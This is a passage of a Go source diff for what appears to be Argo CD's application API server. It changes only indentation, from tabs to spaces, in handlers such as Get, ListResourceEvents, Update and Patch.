argo.APIResourcesToStrings(apiResources, true),\n-\t\t\tHelmRepoCreds:      helmCreds,\n-\t\t\tHelmOptions:        helmOptions,\n-\t\t\tTrackingMethod:     string(argoutil.GetTrackingMethod(s.settingsMgr)),\n-\t\t\tEnabledSourceTypes: enableGenerateManifests,\n-\t\t\tProjectName:        proj.Name,\n-\t\t\tProjectSourceRepos: proj.Spec.SourceRepos,\n-\t\t}\n-\n-\t\trepoStreamClient, err := client.GenerateManifestWithFiles(stream.Context())\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error opening stream: %w\", err)\n-\t\t}\n-\n-\t\terr = manifeststream.SendRepoStream(repoStreamClient, stream, req, *query.Checksum)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error sending repo stream: %w\", err)\n-\t\t}\n-\n-\t\tresp, err := repoStreamClient.CloseAndRecv()\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error generating manifests: %w\", err)\n-\t\t}\n-\n-\t\tmanifestInfo = resp\n-\t\treturn nil\n-\t})\n-\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tfor i, manifest := range manifestInfo.Manifests {\n-\t\tobj := &unstructured.Unstructured{}\n-\t\terr = json.Unmarshal([]byte(manifest), obj)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error unmarshaling manifest into unstructured: %w\", err)\n-\t\t}\n-\t\tif obj.GetKind() == kube.SecretKind && obj.GroupVersionKind().Group == \"\" {\n-\t\t\tobj, _, err = diff.HideSecretData(obj, nil)\n-\t\t\tif err != nil {\n-\t\t\t\treturn fmt.Errorf(\"error hiding secret data: %w\", err)\n-\t\t\t}\n-\t\t\tdata, err := json.Marshal(obj)\n-\t\t\tif err != nil {\n-\t\t\t\treturn fmt.Errorf(\"error marshaling manifest: %w\", err)\n-\t\t\t}\n-\t\t\tmanifestInfo.Manifests[i] = string(data)\n-\t\t}\n-\t}\n-\n-\tstream.SendAndClose(manifestInfo)\n-\treturn nil\n+        ctx := stream.Context()\n+        query, err := manifeststream.ReceiveApplicationManifestQueryWithFiles(stream)\n+\n+        if err != nil {\n+                return fmt.Errorf(\"error getting query: %w\", err)\n+        }\n+\n+        if query.Name == nil || *query.Name == \"\" {\n+                return fmt.Errorf(\"invalid request: application name is missing\")\n+        }\n+\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, query.GetProject(), query.GetAppNamespace(), query.GetName())\n+        if err != nil {\n+                return err\n+        }\n+\n+        var manifestInfo *apiclient.ManifestResponse\n+        err = s.queryRepoServer(ctx, a, func(\n+                client apiclient.RepoServerServiceClient, repo *appv1.Repository, helmRepos []*appv1.Repository, helmCreds []*appv1.RepoCreds, helmOptions *appv1.HelmOptions, kustomizeOptions *appv1.KustomizeOptions, enableGenerateManifests map[string]bool) error {\n+\n+                appInstanceLabelKey, err := s.settingsMgr.GetAppInstanceLabelKey()\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting app instance label key from settings: %w\", err)\n+                }\n+\n+                config, err := s.getApplicationClusterConfig(ctx, a)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting application cluster config: %w\", err)\n+                }\n+\n+                serverVersion, err := s.kubectl.GetServerVersion(config)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting server version: %w\", err)\n+                }\n+\n+                apiResources, err := s.kubectl.GetAPIResources(config, false, kubecache.NewNoopSettings())\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting API resources: %w\", err)\n+                }\n+\n+                source := a.Spec.GetSource()\n+\n+                proj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting app project: %w\", err)\n+                }\n+\n+                req := &apiclient.ManifestRequest{\n+                        Repo:               repo,\n+                        Revision:           source.TargetRevision,\n+                        AppLabelKey:        appInstanceLabelKey,\n+                        AppName:            a.Name,\n+                        Namespace:          a.Spec.Destination.Namespace,\n+                        ApplicationSource:  &source,\n+                        Repos:              helmRepos,\n+                        KustomizeOptions:   kustomizeOptions,\n+                        KubeVersion:        serverVersion,\n+                        ApiVersions:        argo.APIResourcesToStrings(apiResources, true),\n+                        HelmRepoCreds:      helmCreds,\n+                        HelmOptions:        helmOptions,\n+                        TrackingMethod:     string(argoutil.GetTrackingMethod(s.settingsMgr)),\n+                        EnabledSourceTypes: enableGenerateManifests,\n+                        ProjectName:        proj.Name,\n+                        ProjectSourceRepos: proj.Spec.SourceRepos,\n+                }\n+\n+                repoStreamClient, err := client.GenerateManifestWithFiles(stream.Context())\n+                if err != nil {\n+                        return fmt.Errorf(\"error opening stream: %w\", err)\n+                }\n+\n+                err = manifeststream.SendRepoStream(repoStreamClient, stream, req, *query.Checksum)\n+                if err != nil {\n+                        return fmt.Errorf(\"error sending repo stream: %w\", err)\n+                }\n+\n+                resp, err := repoStreamClient.CloseAndRecv()\n+                if err != nil {\n+                        return fmt.Errorf(\"error generating manifests: %w\", err)\n+                }\n+\n+                manifestInfo = resp\n+                return nil\n+        })\n+\n+        if err != nil {\n+                return err\n+        }\n+\n+        for i, manifest := range manifestInfo.Manifests {\n+                obj := &unstructured.Unstructured{}\n+                err = json.Unmarshal([]byte(manifest), obj)\n+                if err != nil {\n+                        return fmt.Errorf(\"error unmarshaling manifest into unstructured: %w\", err)\n+                }\n+                if obj.GetKind() == kube.SecretKind && obj.GroupVersionKind().Group == \"\" {\n+                        obj, _, err = diff.HideSecretData(obj, nil)\n+                        if err != nil {\n+                                return fmt.Errorf(\"error hiding secret data: %w\", err)\n+                        }\n+                        data, err := json.Marshal(obj)\n+                        if err != nil {\n+                                return fmt.Errorf(\"error marshaling manifest: %w\", err)\n+                        }\n+                        manifestInfo.Manifests[i] = string(data)\n+                }\n+        }\n+\n+        stream.SendAndClose(manifestInfo)\n+        return nil\n }\n \n // Get returns an application by name\n func (s *Server) Get(ctx context.Context, q *application.ApplicationQuery) (*appv1.Application, error) {\n-\tappName := q.GetName()\n-\tappNs := s.appNamespaceOrDefault(q.GetAppNamespace())\n-\n-\tproject := \"\"\n-\tprojects := getProjectsFromApplicationQuery(*q)\n-\tif len(projects) == 1 {\n-\t\tproject = projects[0]\n-\t} else if len(projects) > 1 {\n-\t\treturn nil, status.Errorf(codes.InvalidArgument, \"multiple projects specified - the get endpoint accepts either zero or one project\")\n-\t}\n-\n-\t// We must use a client Get instead of an informer Get, because it's common to call Get immediately\n-\t// following a Watch (which is not yet powered by an informer), and the Get must reflect what was\n-\t// previously seen by the client.\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, project, appNs, appName, q.GetResourceVersion())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\ts.inferResourcesStatusHealth(a)\n-\n-\tif q.Refresh == nil {\n-\t\treturn a, nil\n-\t}\n-\n-\trefreshType := appv1.RefreshTypeNormal\n-\tif *q.Refresh == string(appv1.RefreshTypeHard) {\n-\t\trefreshType = appv1.RefreshTypeHard\n-\t}\n-\tappIf := s.appclientset.ArgoprojV1alpha1().Applications(appNs)\n-\n-\t// subscribe early with buffered channel to ensure we don't miss events\n-\tevents := make(chan *appv1.ApplicationWatchEvent, watchAPIBufferSize)\n-\tunsubscribe := s.appBroadcaster.Subscribe(events, func(event *appv1.ApplicationWatchEvent) bool {\n-\t\treturn event.Application.Name == appName && event.Application.Namespace == appNs\n-\t})\n-\tdefer unsubscribe()\n-\n-\tapp, err := argoutil.RefreshApp(appIf, appName, refreshType)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error refreshing the app: %w\", err)\n-\t}\n-\n-\tif refreshType == appv1.RefreshTypeHard {\n-\t\t// force refresh cached application details\n-\t\tif err := s.queryRepoServer(ctx, a, func(\n-\t\t\tclient apiclient.RepoServerServiceClient,\n-\t\t\trepo *appv1.Repository,\n-\t\t\thelmRepos []*appv1.Repository,\n-\t\t\t_ []*appv1.RepoCreds,\n-\t\t\thelmOptions *appv1.HelmOptions,\n-\t\t\tkustomizeOptions *appv1.KustomizeOptions,\n-\t\t\tenabledSourceTypes map[string]bool,\n-\t\t) error {\n-\t\t\tsource := app.Spec.GetSource()\n-\t\t\t_, err := client.GetAppDetails(ctx, &apiclient.RepoServerAppDetailsQuery{\n-\t\t\t\tRepo:               repo,\n-\t\t\t\tSource:             &source,\n-\t\t\t\tAppName:            appName,\n-\t\t\t\tKustomizeOptions:   kustomizeOptions,\n-\t\t\t\tRepos:              helmRepos,\n-\t\t\t\tNoCache:            true,\n-\t\t\t\tTrackingMethod:     string(argoutil.GetTrackingMethod(s.settingsMgr)),\n-\t\t\t\tEnabledSourceTypes: enabledSourceTypes,\n-\t\t\t\tHelmOptions:        helmOptions,\n-\t\t\t})\n-\t\t\treturn err\n-\t\t}); err != nil {\n-\t\t\tlog.Warnf(\"Failed to force refresh application details: %v\", err)\n-\t\t}\n-\t}\n-\n-\tminVersion := 0\n-\tif minVersion, err = strconv.Atoi(app.ResourceVersion); err != nil {\n-\t\tminVersion = 0\n-\t}\n-\n-\tfor {\n-\t\tselect {\n-\t\tcase <-ctx.Done():\n-\t\t\treturn nil, fmt.Errorf(\"application refresh deadline exceeded\")\n-\t\tcase event := <-events:\n-\t\t\tif appVersion, err := strconv.Atoi(event.Application.ResourceVersion); err == nil && appVersion > minVersion {\n-\t\t\t\tannotations := event.Application.GetAnnotations()\n-\t\t\t\tif annotations == nil {\n-\t\t\t\t\tannotations = make(map[string]string)\n-\t\t\t\t}\n-\t\t\t\tif _, ok := annotations[appv1.AnnotationKeyRefresh]; !ok {\n-\t\t\t\t\treturn &event.Application, nil\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n+        appName := q.GetName()\n+        appNs := s.appNamespaceOrDefault(q.GetAppNamespace())\n+\n+        project := \"\"\n+        projects := getProjectsFromApplicationQuery(*q)\n+        if len(projects) == 1 {\n+                project = projects[0]\n+        } else if len(projects) > 1 {\n+                return nil, status.Errorf(codes.InvalidArgument, \"multiple projects specified - the get endpoint accepts either zero or one project\")\n+        }\n+\n+        // We must use a client Get instead of an informer Get, because it's common to call Get immediately\n+        // following a Watch (which is not yet powered by an informer), and the Get must reflect what was\n+        // previously seen by the client.\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, project, appNs, appName, q.GetResourceVersion())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        s.inferResourcesStatusHealth(a)\n+\n+        if q.Refresh == nil {\n+                return a, nil\n+        }\n+\n+        refreshType := appv1.RefreshTypeNormal\n+        if *q.Refresh == string(appv1.RefreshTypeHard) {\n+                refreshType = appv1.RefreshTypeHard\n+        }\n+        appIf := s.appclientset.ArgoprojV1alpha1().Applications(appNs)\n+\n+        // subscribe early with buffered channel to ensure we don't miss events\n+        events := make(chan *appv1.ApplicationWatchEvent, watchAPIBufferSize)\n+        unsubscribe := s.appBroadcaster.Subscribe(events, func(event *appv1.ApplicationWatchEvent) bool {\n+                return event.Application.Name == appName && event.Application.Namespace == appNs\n+        })\n+        defer unsubscribe()\n+\n+        app, err := argoutil.RefreshApp(appIf, appName, refreshType)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error refreshing the app: %w\", err)\n+        }\n+\n+        if refreshType == appv1.RefreshTypeHard {\n+                // force refresh cached application details\n+                if err := s.queryRepoServer(ctx, a, func(\n+                        client apiclient.RepoServerServiceClient,\n+                        repo *appv1.Repository,\n+                        helmRepos []*appv1.Repository,\n+                        _ []*appv1.RepoCreds,\n+                        helmOptions *appv1.HelmOptions,\n+                        kustomizeOptions *appv1.KustomizeOptions,\n+                        enabledSourceTypes map[string]bool,\n+                ) error {\n+                        source := app.Spec.GetSource()\n+                        _, err := client.GetAppDetails(ctx, &apiclient.RepoServerAppDetailsQuery{\n+                                Repo:               repo,\n+                                Source:             &source,\n+                                AppName:            appName,\n+                                KustomizeOptions:   kustomizeOptions,\n+                                Repos:              helmRepos,\n+                                NoCache:            true,\n+                                TrackingMethod:     string(argoutil.GetTrackingMethod(s.settingsMgr)),\n+                                EnabledSourceTypes: enabledSourceTypes,\n+                                HelmOptions:        helmOptions,\n+                        })\n+                        return err\n+                }); err != nil {\n+                        log.Warnf(\"Failed to force refresh application details: %v\", err)\n+                }\n+        }\n+\n+        minVersion := 0\n+        if minVersion, err = strconv.Atoi(app.ResourceVersion); err != nil {\n+                minVersion = 0\n+        }\n+\n+        for {\n+                select {\n+                case <-ctx.Done():\n+                        return nil, fmt.Errorf(\"application refresh deadline exceeded\")\n+                case event := <-events:\n+                        if appVersion, err := strconv.Atoi(event.Application.ResourceVersion); err == nil && appVersion > minVersion {\n+                                annotations := event.Application.GetAnnotations()\n+                                if annotations == nil {\n+                                        annotations = make(map[string]string)\n+                                }\n+                                if _, ok := annotations[appv1.AnnotationKeyRefresh]; !ok {\n+                                        return &event.Application, nil\n+                                }\n+                        }\n+                }\n+        }\n }\n \n // ListResourceEvents returns a list of event resources\n func (s *Server) ListResourceEvents(ctx context.Context, q *application.ApplicationResourceEventsQuery) (*v1.EventList, error) {\n-\ta, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tvar (\n-\t\tkubeClientset kubernetes.Interface\n-\t\tfieldSelector string\n-\t\tnamespace     string\n-\t)\n-\t// There are two places where we get events. If we are getting application events, we query\n-\t// our own cluster. If it is events on a resource on an external cluster, then we query the\n-\t// external cluster using its rest.Config\n-\tif q.GetResourceName() == \"\" && q.GetResourceUID() == \"\" {\n-\t\tkubeClientset = s.kubeclientset\n-\t\tnamespace = a.Namespace\n-\t\tfieldSelector = fields.SelectorFromSet(map[string]string{\n-\t\t\t\"involvedObject.name\":      a.Name,\n-\t\t\t\"involvedObject.uid\":       string(a.UID),\n-\t\t\t\"involvedObject.namespace\": a.Namespace,\n-\t\t}).String()\n-\t} else {\n-\t\ttree, err := s.getAppResources(ctx, a)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error getting app resources: %w\", err)\n-\t\t}\n-\t\tfound := false\n-\t\tfor _, n := range append(tree.Nodes, tree.OrphanedNodes...) {\n-\t\t\tif n.ResourceRef.UID == q.GetResourceUID() && n.ResourceRef.Name == q.GetResourceName() && n.ResourceRef.Namespace == q.GetResourceNamespace() {\n-\t\t\t\tfound = true\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t\tif !found {\n-\t\t\treturn nil, status.Errorf(codes.InvalidArgument, \"%s not found as part of application %s\", q.GetResourceName(), q.GetName())\n-\t\t}\n-\n-\t\tnamespace = q.GetResourceNamespace()\n-\t\tvar config *rest.Config\n-\t\tconfig, err = s.getApplicationClusterConfig(ctx, a)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error getting application cluster config: %w\", err)\n-\t\t}\n-\t\tkubeClientset, err = kubernetes.NewForConfig(config)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error creating kube client: %w\", err)\n-\t\t}\n-\t\tfieldSelector = fields.SelectorFromSet(map[string]string{\n-\t\t\t\"involvedObject.name\":      q.GetResourceName(),\n-\t\t\t\"involvedObject.uid\":       q.GetResourceUID(),\n-\t\t\t\"involvedObject.namespace\": namespace,\n-\t\t}).String()\n-\t}\n-\tlog.Infof(\"Querying for resource events with field selector: %s\", fieldSelector)\n-\topts := metav1.ListOptions{FieldSelector: fieldSelector}\n-\tlist, err := kubeClientset.CoreV1().Events(namespace).List(ctx, opts)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error listing resource events: %w\", err)\n-\t}\n-\treturn list, nil\n+        a, err := s.getApplicationEnforceRBACInformer(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        var (\n+                kubeClientset kubernetes.Interface\n+                fieldSelector string\n+                namespace     string\n+        )\n+        // There are two places where we get events. If we are getting application events, we query\n+        // our own cluster. If it is events on a resource on an external cluster, then we query the\n+        // external cluster using its rest.Config\n+        if q.GetResourceName() == \"\" && q.GetResourceUID() == \"\" {\n+                kubeClientset = s.kubeclientset\n+                namespace = a.Namespace\n+                fieldSelector = fields.SelectorFromSet(map[string]string{\n+                        \"involvedObject.name\":      a.Name,\n+                        \"involvedObject.uid\":       string(a.UID),\n+                        \"involvedObject.namespace\": a.Namespace,\n+                }).String()\n+        } else {\n+                tree, err := s.getAppResources(ctx, a)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error getting app resources: %w\", err)\n+                }\n+                found := false\n+                for _, n := range append(tree.Nodes, tree.OrphanedNodes...) {\n+                        if n.ResourceRef.UID == q.GetResourceUID() && n.ResourceRef.Name == q.GetResourceName() && n.ResourceRef.Namespace == q.GetResourceNamespace() {\n+                                found = true\n+                                break\n+                        }\n+                }\n+                if !found {\n+                        return nil, status.Errorf(codes.InvalidArgument, \"%s not found as part of application %s\", q.GetResourceName(), q.GetName())\n+                }\n+\n+                namespace = q.GetResourceNamespace()\n+                var config *rest.Config\n+                config, err = s.getApplicationClusterConfig(ctx, a)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error getting application cluster config: %w\", err)\n+                }\n+                kubeClientset, err = kubernetes.NewForConfig(config)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error creating kube client: %w\", err)\n+                }\n+                fieldSelector = fields.SelectorFromSet(map[string]string{\n+                        \"involvedObject.name\":      q.GetResourceName(),\n+                        \"involvedObject.uid\":       q.GetResourceUID(),\n+                        \"involvedObject.namespace\": namespace,\n+                }).String()\n+        }\n+        log.Infof(\"Querying for resource events with field selector: %s\", fieldSelector)\n+        opts := metav1.ListOptions{FieldSelector: fieldSelector}\n+        list, err := kubeClientset.CoreV1().Events(namespace).List(ctx, opts)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error listing resource events: %w\", err)\n+        }\n+        return list, nil\n }\n \n // validateAndUpdateApp validates and updates the application. currentProject is the name of the project the app\n // currently is under. If not specified, we assume that the app is under the project specified in the app spec.\n func (s *Server) validateAndUpdateApp(ctx context.Context, newApp *appv1.Application, merge bool, validate bool, action string, currentProject string) (*appv1.Application, error) {\n-\ts.projectLock.RLock(newApp.Spec.GetProject())\n-\tdefer s.projectLock.RUnlock(newApp.Spec.GetProject())\n-\n-\tapp, err := s.getApplicationEnforceRBACClient(ctx, action, currentProject, newApp.Namespace, newApp.Name, \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\terr = s.validateAndNormalizeApp(ctx, newApp, validate)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error validating and normalizing app: %w\", err)\n-\t}\n-\n-\ta, err := s.updateApp(app, newApp, ctx, merge)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error updating application: %w\", err)\n-\t}\n-\treturn a, nil\n+        s.projectLock.RLock(newApp.Spec.GetProject())\n+        defer s.projectLock.RUnlock(newApp.Spec.GetProject())\n+\n+        app, err := s.getApplicationEnforceRBACClient(ctx, action, currentProject, newApp.Namespace, newApp.Name, \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        err = s.validateAndNormalizeApp(ctx, newApp, validate)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error validating and normalizing app: %w\", err)\n+        }\n+\n+        a, err := s.updateApp(app, newApp, ctx, merge)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error updating application: %w\", err)\n+        }\n+        return a, nil\n }\n \n var informerSyncTimeout = 2 * time.Second\n@@ -837,1636 +842,1636 @@ var informerSyncTimeout = 2 * time.Second\n // after a mutating API call (create/update). This function should be called after a creates &\n // update to give a probable (but not guaranteed) chance of being up-to-date after the create/update.\n func (s *Server) waitSync(app *appv1.Application) {\n-\tlogCtx := log.WithField(\"application\", app.Name)\n-\tdeadline := time.Now().Add(informerSyncTimeout)\n-\tminVersion, err := strconv.Atoi(app.ResourceVersion)\n-\tif err != nil {\n-\t\tlogCtx.Warnf(\"waitSync failed: could not parse resource version %s\", app.ResourceVersion)\n-\t\ttime.Sleep(50 * time.Millisecond) // sleep anyway\n-\t\treturn\n-\t}\n-\tfor {\n-\t\tif currApp, err := s.appLister.Applications(app.Namespace).Get(app.Name); err == nil {\n-\t\t\tcurrVersion, err := strconv.Atoi(currApp.ResourceVersion)\n-\t\t\tif err == nil && currVersion >= minVersion {\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t\tif time.Now().After(deadline) {\n-\t\t\tbreak\n-\t\t}\n-\t\ttime.Sleep(20 * time.Millisecond)\n-\t}\n-\tlogCtx.Warnf(\"waitSync failed: timed out\")\n+        logCtx := log.WithField(\"application\", app.Name)\n+        deadline := time.Now().Add(informerSyncTimeout)\n+        minVersion, err := strconv.Atoi(app.ResourceVersion)\n+        if err != nil {\n+                logCtx.Warnf(\"waitSync failed: could not parse resource version %s\", app.ResourceVersion)\n+                time.Sleep(50 * time.Millisecond) // sleep anyway\n+                return\n+        }\n+        for {\n+                if currApp, err := s.appLister.Applications(app.Namespace).Get(app.Name); err == nil {\n+                        currVersion, err := strconv.Atoi(currApp.ResourceVersion)\n+                        if err == nil && currVersion >= minVersion {\n+                                return\n+                        }\n+                }\n+                if time.Now().After(deadline) {\n+                        break\n+                }\n+                time.Sleep(20 * time.Millisecond)\n+        }\n+        logCtx.Warnf(\"waitSync failed: timed out\")\n }\n \n func (s *Server) updateApp(app *appv1.Application, newApp *appv1.Application, ctx context.Context, merge bool) (*appv1.Application, error) {\n-\tfor i := 0; i < 10; i++ {\n-\t\tapp.Spec = newApp.Spec\n-\t\tif merge {\n-\t\t\tapp.Labels = collections.MergeStringMaps(app.Labels, newApp.Labels)\n-\t\t\tapp.Annotations = collections.MergeStringMaps(app.Annotations, newApp.Annotations)\n-\t\t} else {\n-\t\t\tapp.Labels = newApp.Labels\n-\t\t\tapp.Annotations = newApp.Annotations\n-\t\t}\n-\n-\t\tapp.Finalizers = newApp.Finalizers\n-\n-\t\tres, err := s.appclientset.ArgoprojV1alpha1().Applications(app.Namespace).Update(ctx, app, metav1.UpdateOptions{})\n-\t\tif err == nil {\n-\t\t\ts.logAppEvent(app, ctx, argo.EventReasonResourceUpdated, \"updated application spec\")\n-\t\t\ts.waitSync(res)\n-\t\t\treturn res, nil\n-\t\t}\n-\t\tif !apierr.IsConflict(err) {\n-\t\t\treturn nil, err\n-\t\t}\n-\n-\t\tapp, err = s.appclientset.ArgoprojV1alpha1().Applications(app.Namespace).Get(ctx, newApp.Name, metav1.GetOptions{})\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error getting application: %w\", err)\n-\t\t}\n-\t\ts.inferResourcesStatusHealth(app)\n-\t}\n-\treturn nil, status.Errorf(codes.Internal, \"Failed to update application. Too many conflicts\")\n+        for i := 0; i < 10; i++ {\n+                app.Spec = newApp.Spec\n+                if merge {\n+                        app.Labels = collections.MergeStringMaps(app.Labels, newApp.Labels)\n+                        app.Annotations = collections.MergeStringMaps(app.Annotations, newApp.Annotations)\n+                } else {\n+                        app.Labels = newApp.Labels\n+                        app.Annotations = newApp.Annotations\n+                }\n+\n+                app.Finalizers = newApp.Finalizers\n+\n+                res, err := s.appclientset.ArgoprojV1alpha1().Applications(app.Namespace).Update(ctx, app, metav1.UpdateOptions{})\n+                if err == nil {\n+                        s.logAppEvent(app, ctx, argo.EventReasonResourceUpdated, \"updated application spec\")\n+                        s.waitSync(res)\n+                        return res, nil\n+                }\n+                if !apierr.IsConflict(err) {\n+                        return nil, err\n+                }\n+\n+                app, err = s.appclientset.ArgoprojV1alpha1().Applications(app.Namespace).Get(ctx, newApp.Name, metav1.GetOptions{})\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error getting application: %w\", err)\n+                }\n+                s.inferResourcesStatusHealth(app)\n+        }\n+        return nil, status.Errorf(codes.Internal, \"Failed to update application. Too many conflicts\")\n }\n \n // Update updates an application\n func (s *Server) Update(ctx context.Context, q *application.ApplicationUpdateRequest) (*appv1.Application, error) {\n-\tif q.GetApplication() == nil {\n-\t\treturn nil, fmt.Errorf(\"error updating application: application is nil in request\")\n-\t}\n-\ta := q.GetApplication()\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, a.RBACName(s.ns)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tvalidate := true\n-\tif q.Validate != nil {\n-\t\tvalidate = *q.Validate\n-\t}\n-\treturn s.validateAndUpdateApp(ctx, q.Application, false, validate, rbacpolicy.ActionUpdate, q.GetProject())\n+        if q.GetApplication() == nil {\n+                return nil, fmt.Errorf(\"error updating application: application is nil in request\")\n+        }\n+        a := q.GetApplication()\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, a.RBACName(s.ns)); err != nil {\n+                return nil, err\n+        }\n+\n+        validate := true\n+        if q.Validate != nil {\n+                validate = *q.Validate\n+        }\n+        return s.validateAndUpdateApp(ctx, q.Application, false, validate, rbacpolicy.ActionUpdate, q.GetProject())\n }\n \n // UpdateSpec updates an application spec and filters out any invalid parameter overrides\n func (s *Server) UpdateSpec(ctx context.Context, q *application.ApplicationUpdateSpecRequest) (*appv1.ApplicationSpec, error) {\n-\tif q.GetSpec() == nil {\n-\t\treturn nil, fmt.Errorf(\"error updating application spec: spec is nil in request\")\n-\t}\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionUpdate, q.GetProject(), q.GetAppNamespace(), q.GetName(), \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\ta.Spec = *q.GetSpec()\n-\tvalidate := true\n-\tif q.Validate != nil {\n-\t\tvalidate = *q.Validate\n-\t}\n-\ta, err = s.validateAndUpdateApp(ctx, a, false, validate, rbacpolicy.ActionUpdate, q.GetProject())\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error validating and updating app: %w\", err)\n-\t}\n-\treturn &a.Spec, nil\n+        if q.GetSpec() == nil {\n+                return nil, fmt.Errorf(\"error updating application spec: spec is nil in request\")\n+        }\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionUpdate, q.GetProject(), q.GetAppNamespace(), q.GetName(), \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        a.Spec = *q.GetSpec()\n+        validate := true\n+        if q.Validate != nil {\n+                validate = *q.Validate\n+        }\n+        a, err = s.validateAndUpdateApp(ctx, a, false, validate, rbacpolicy.ActionUpdate, q.GetProject())\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error validating and updating app: %w\", err)\n+        }\n+        return &a.Spec, nil\n }\n \n // Patch patches an application\n func (s *Server) Patch(ctx context.Context, q *application.ApplicationPatchRequest) (*appv1.Application, error) {\n-\tapp, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName(), \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif err = s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, app.RBACName(s.ns)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tjsonApp, err := json.Marshal(app)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error marshaling application: %w\", err)\n-\t}\n-\n-\tvar patchApp []byte\n-\n-\tswitch q.GetPatchType() {\n-\tcase \"json\", \"\":\n-\t\tpatch, err := jsonpatch.DecodePatch([]byte(q.GetPatch()))\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error decoding json patch: %w\", err)\n-\t\t}\n-\t\tpatchApp, err = patch.Apply(jsonApp)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error applying patch: %w\", err)\n-\t\t}\n-\tcase \"merge\":\n-\t\tpatchApp, err = jsonpatch.MergePatch(jsonApp, []byte(q.GetPatch()))\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error calculating merge patch: %w\", err)\n-\t\t}\n-\tdefault:\n-\t\treturn nil, status.Error(codes.InvalidArgument, fmt.Sprintf(\"Patch type '%s' is not supported\", q.GetPatchType()))\n-\t}\n-\n-\tnewApp := &appv1.Application{}\n-\terr = json.Unmarshal(patchApp, newApp)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error unmarshaling patched app: %w\", err)\n-\t}\n-\treturn s.validateAndUpdateApp(ctx, newApp, false, true, rbacpolicy.ActionUpdate, q.GetProject())\n+        app, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName(), \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        if err = s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionUpdate, app.RBACName(s.ns)); err != nil {\n+                return nil, err\n+        }\n+\n+        jsonApp, err := json.Marshal(app)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error marshaling application: %w\", err)\n+        }\n+\n+        var patchApp []byte\n+\n+        switch q.GetPatchType() {\n+        case \"json\", \"\":\n+                patch, err := jsonpatch.DecodePatch([]byte(q.GetPatch()))\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error decoding json patch: %w\", err)\n+                }\n+                patchApp, err = patch.Apply(jsonApp)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error applying patch: %w\", err)\n+                }\n+        